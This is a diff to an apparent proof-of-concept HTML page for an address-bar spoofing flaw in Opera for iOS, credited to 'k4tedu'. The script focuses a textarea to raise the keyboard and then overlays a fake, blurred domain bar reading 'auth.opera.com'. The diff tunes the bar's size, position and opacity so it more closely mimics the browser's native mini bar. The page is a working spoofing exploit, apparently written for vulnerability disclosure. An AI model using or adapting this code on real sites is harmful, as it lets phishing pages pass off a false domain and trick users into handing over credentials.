@@ -2,60 +2,75 @@
 <html lang="en">
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<title>Opera iOS URL Spoof PoC</title>
+<title>Opera iOS Mini Bar Spoof PoC</title>
 <style>
+  body {
+    margin: 0;
+    padding: 20px;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  }
+
   button { 
     padding: 12px 18px; 
     font-size: 16px; 
-    margin: 20px; 
     border: 1px solid #ccc; 
     background-color: #f0f0f0; 
     border-radius: 8px;
     cursor: pointer;
+    width: 100%;
+    margin-bottom: 15px;
   }
   
   textarea { 
-    width: 90%; 
+    width: 100%; 
     height: 80px; 
-    font-size: 18px; 
-    margin: 20px auto; 
-    display: block;
+    font-size: 16px; 
     border: 1px solid #ccc;
     border-radius: 8px;
     padding: 10px;
+    box-sizing: border-box;
   }
+
   .fake-bar {
     text-align: center;
-    color: #000;
-    font-size: 17px;
+    color: #000000;
+    font-size: 13px;
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     font-weight: 400;
+    
     position: fixed;
     width: auto;
-    min-width: 260px;
-    max-width: 90%;
+    min-width: 180px;
+    max-width: 220px;
     left: 50%;
     transform: translateX(-50%);
     z-index: 2147483647;
-    background: rgba(255, 255, 255, 0.7);
+    
+    background: rgba(255, 255, 255, 0.92);
     -webkit-backdrop-filter: blur(20px);
     backdrop-filter: blur(20px);
-    border-radius: 50px;
-    padding: 12px 25px;
-    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15); 
-    border: 0.5px solid rgba(0, 0, 0, 0.1);
+    
+    border-radius: 20px;
+    padding: 5px 14px;
+    
+    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.12);
+    border: 0.5px solid rgba(0, 0, 0, 0.08);
+    
     opacity: 0;
     visibility: hidden;
-    transition: opacity 0.2s ease, transform 0.2s ease;
+    transition: opacity 0.15s ease;
+    
     display: flex;
     align-items: center;
     justify-content: center;
+    pointer-events: none;
   }
+
   .fake-bar.show {
     opacity: 1;
     visibility: visible;
-    transform: translateX(-50%) translateY(-10px); 
   }
+
   .domain-text {
     white-space: nowrap;
     overflow: hidden;
@@ -63,23 +78,13 @@
     display: block;
     width: 100%;
   }
-
 </style>
 </head>
 <body>
 
-<h3>PoC: Opera iOS Native Bar Disappears by k4tedu</h3>
-<p>
-  Petunjuk:
-  <ol>
-    <li>Perhatikan URL bar asli Opera di bawah (jika terlihat).</li>
-    <li>Klik tombol "auth.opera.com".</li>
-    <li>Perhatikan jika URL Bar asli Opera menghilang dan digantikan oleh URL Bar palsu di atas keyboard.</li>
-  </ol>
-</p>
-
 <button id="showBtn">Go to auth.opera.com</button>
-<textarea id="ta" placeholder="Focus target... (to force keyboard)"></textarea>
+<textarea id="ta" placeholder="Textarea for forced focus…"></textarea>
+
 <div class="fake-bar" id="fakeBar">
   <span class="domain-text">auth.opera.com</span>
 </div>
@@ -87,15 +92,14 @@
 <script>
 const fakeBar = document.getElementById('fakeBar');
 const ta = document.getElementById('ta');
+
 function adjustFakeBar() {
   const vv = window.visualViewport;
-  
   if (vv) {
     const yPos = vv.offsetTop + vv.height;
-    fakeBar.style.top = (yPos - 10) + 'px';
+    fakeBar.style.top = (yPos - 85) + 'px';
   }
 }
-
 
 function showFakeBar() {
   adjustFakeBar();
@@ -105,21 +109,22 @@ function showFakeBar() {
 function hideFakeBar() {
   fakeBar.classList.remove('show');
 }
+
 if ('visualViewport' in window) {
   window.visualViewport.addEventListener('resize', () => {
     if (document.activeElement === ta) adjustFakeBar();
   });
   window.visualViewport.addEventListener('scroll', adjustFakeBar);
 }
+
 document.getElementById("showBtn").onclick = () => {
   ta.focus();
   setTimeout(() => {
     showFakeBar();
-  }, 300);
+  }, 350);
 };
 
 ta.addEventListener('blur', hideFakeBar);
-
 </script>
 
 </body>
